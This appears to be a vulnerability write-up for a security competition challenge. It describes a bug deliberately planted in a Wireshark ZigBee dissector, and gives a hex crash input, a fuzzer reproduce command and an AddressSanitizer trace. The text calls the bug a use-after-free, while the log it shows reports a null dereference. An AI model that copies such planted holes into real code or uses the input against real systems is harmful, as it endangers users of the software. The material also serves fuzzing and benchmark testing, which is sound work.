# What functions and functionality is relevant?
The relevant function is `dissect_zbee_zdp_req_mgmt_nwk_disc` which is located inside of `epan/dissectors/packet-zbee-zdp-management.c`

# Why is this vulnerable?
This vulnerability arises out of the assumption of vestigial debugging code (designed to look like what a developer would write to understand and fix a protocol bug...and accidentally include it in a code push) that made assumptions about the state of the packet stream. The code relies upon the first channel (within the ZigBee protocol) being already populated and allocated, but this does not necessarily have to have happened before this code can be triggered, leading to a use-after-free.

# Is this a replay and/or is inspired by anything?
This challenge is inspired by other vulnerabilities in channel and state dependent protocols...as well as common mistakes when implementing debugging code.

# What makes it interesting?
This vulnerability is interesting because the vulnerable debugging code can be clearly seen to be not intended to be part of the implemented protocol, and appears to be residual code from an inexperienced contributor.

# Additional Information 

Crash:

```
----------------------------------------------------------------------------------------------------------------------------
[-----                         BUILDING EXPLOITABLE BLOB @ blobs/blob.bin                                -----]

        20 10 13 f4 ff 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
        41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
        41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
        41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
        41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
        41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
        41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
        41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
        41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
        41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
        41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
        41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
        41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
        41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
        41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
        41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
        41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
        41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
        41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
        41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
        41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
        41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
        41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
        41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
        41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
        41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
        41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
        41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
        41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
        41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
        41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
        41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
        41 41 41 41 41

[-----                         BUILDING EXPLOITABLE BLOB @ blobs/blob.bin                                -----]
----------------------------------------------------------------------------------------------------------------------------
INFO:__main__:Running: docker run --privileged --shm-size=2g --platform linux/amd64 --rm -i -e HELPER=True -e ARCHITECTURE=x86_64 -e FUZZSHARK_TARGET=zbee_zdp -v /oss-fuzz-aixcc/build/out/wireshark:/out -v /wireshark/.aixcc/vulns/vuln_012/blobs/blob.bin:/testcase -t ghcr.io/aixcc-finals/base-runner:v1.1.0 reproduce fuzzshark -runs=100.
+ FUZZER=fuzzshark
+ shift
+ '[' '!' -v TESTCASE ']'
+ TESTCASE=/testcase
+ '[' '!' -f /testcase ']'
+ export RUN_FUZZER_MODE=interactive
+ RUN_FUZZER_MODE=interactive
+ export FUZZING_ENGINE=libfuzzer
+ FUZZING_ENGINE=libfuzzer
+ export SKIP_SEED_CORPUS=1
+ SKIP_SEED_CORPUS=1
+ run_fuzzer fuzzshark -runs=100 /testcase
vm.mmap_rnd_bits = 28
/out/fuzzshark -rss_limit_mb=2560 -timeout=25 -runs=100 /testcase -max_len=1024 < /dev/null
oss-fuzzshark: disabling: snort
oss-fuzzshark: requested dissector: zbee_zdp
INFO: Running with entropic power schedule (0xFF, 100).
INFO: Seed: 3583118246
INFO: Loaded 1 modules   (420175 inline 8-bit counters): 420175 [0xabcec10, 0xac3555f),
INFO: Loaded 1 PC tables (420175 PCs): 420175 [0xac35560,0xb29ea50),
/out/fuzzshark: Running 1 inputs 100 time(s) each.
Running: /testcase
channels_and_flags = 0xf8f8f8f8
AddressSanitizer:DEADLYSIGNAL
=================================================================
==18==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000001 (pc 0x7f8d3cb1f915 bp 0x7ffefce25eb0 sp 0x7ffefce25938 T0)
==18==The signal is caused by a READ memory access.
==18==Hint: address points to the zero page.
SCARINESS: 10 (null-deref)
    #0 0x7f8d3cb1f915  (/lib/x86_64-linux-gnu/libc.so.6+0x188915) (BuildId: 0323ab4806bee6f846d9ad4bccfc29afdca49a58)
    #1 0x7f8d3ca0fd14  (/lib/x86_64-linux-gnu/libc.so.6+0x78d14) (BuildId: 0323ab4806bee6f846d9ad4bccfc29afdca49a58)
    #2 0x7f8d3cac527a in __printf_chk (/lib/x86_64-linux-gnu/libc.so.6+0x12e27a) (BuildId: 0323ab4806bee6f846d9ad4bccfc29afdca49a58)
    #3 0x21cdebe in dissect_zbee_zdp_req_mgmt_nwk_disc /src/wireshark/epan/dissectors/packet-zbee-zdp-management.c:246:17
    #4 0x21cd850 in dissect_zbee_zdp /src/wireshark/epan/dissectors/packet-zbee-zdp.c:1237:13
    #5 0x73991d in call_dissector_through_handle /src/wireshark/epan/packet.c:887:9
    #6 0x73991d in call_dissector_work /src/wireshark/epan/packet.c:975:9
    #7 0x744574 in call_dissector_only /src/wireshark/epan/packet.c:3621:8
    #8 0x744574 in call_all_postdissectors /src/wireshark/epan/packet.c:4166:3
    #9 0x10906b7 in dissect_frame /src/wireshark/epan/dissectors/packet-frame.c:1438:5
    #10 0x73991d in call_dissector_through_handle /src/wireshark/epan/packet.c:887:9
    #11 0x73991d in call_dissector_work /src/wireshark/epan/packet.c:975:9
    #12 0x735417 in call_dissector_only /src/wireshark/epan/packet.c:3621:8
    #13 0x735417 in call_dissector_with_data /src/wireshark/epan/packet.c:3634:8
    #14 0x735417 in dissect_record /src/wireshark/epan/packet.c:687:3
    #15 0x726cb0 in epan_dissect_run /src/wireshark/epan/epan.c:666:2
    #16 0x5971f8 in LLVMFuzzerTestOneInput /src/wireshark/fuzz/fuzzshark.c:359:2
    #17 0x44bb70 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) /src/llvm-project/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:614:13
    #18 0x436de5 in fuzzer::RunOneTest(fuzzer::Fuzzer*, char const*, unsigned long) /src/llvm-project/compiler-rt/lib/fuzzer/FuzzerDriver.cpp:327:6
    #19 0x43c87f in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) /src/llvm-project/compiler-rt/lib/fuzzer/FuzzerDriver.cpp:862:9
    #20 0x467b22 in main /src/llvm-project/compiler-rt/lib/fuzzer/FuzzerMain.cpp:20:10
    #21 0x7f8d3c9bb082 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x24082) (BuildId: 0323ab4806bee6f846d9ad4bccfc29afdca49a58)
    #22 0x42efcd in _start (/out/fuzzshark+0x42efcd)

DEDUP_TOKEN: __printf_chk
AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: SEGV (/lib/x86_64-linux-gnu/libc.so.6+0x188915) (BuildId: 0323ab4806bee6f846d9ad4bccfc29afdca49a58)
==18==ABORTING
MS: 0 ; base unit: 0000000000000000000000000000000000000000
subprocess command returned a non-zero exit status: 1
```
